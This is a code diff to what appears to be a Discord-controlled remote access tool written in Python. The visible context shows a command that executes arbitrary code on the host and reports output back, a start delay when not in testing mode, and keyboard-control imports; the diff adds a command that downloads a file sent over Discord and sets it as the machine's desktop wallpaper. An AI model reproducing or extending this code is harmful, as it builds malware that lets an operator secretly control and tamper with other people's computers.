@@ -32,8 +32,8 @@ from functools import wraps
 import keyboard
 from pynput.keyboard import Key, Controller
 
-TESTING = False
-VERSION = "v6.2"
+TESTING = True
+VERSION = "v6.3"
 if not TESTING:
     time.sleep(60)
 
@@ -594,6 +594,26 @@ async def main():
             await ctx.respond(f"Executed\n```{buffer.getvalue()}```")
         except Exception as e:
             await ctx.respond(f"Error executing: `" + str(e)+'`')
+
+    @bot.slash_command(name="background", description="set dessktop background")
+    @option("file", description="image", input_type=discord.Attachment, required=True)
+    async def background(ctx: discord.ApplicationContext, file: discord.Attachment):
+        await ctx.defer()
+
+        filename = "wallpaper.jpg"
+        filepath = os.path.join(os.getcwd(), filename)
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(file.url) as resp:
+                if resp.status == 200:
+                    with open(filepath, "wb") as f:
+                        f.write(await resp.read())
+
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
+        embed = discord.Embed(title="Wallpaper set", description=file.filename)
+        embed.set_image(url=file.proxy_url or file.url)
+
+        await ctx.respond(embed=embed)
 
     @bot.event
     async def on_application_command_error(ctx, error):
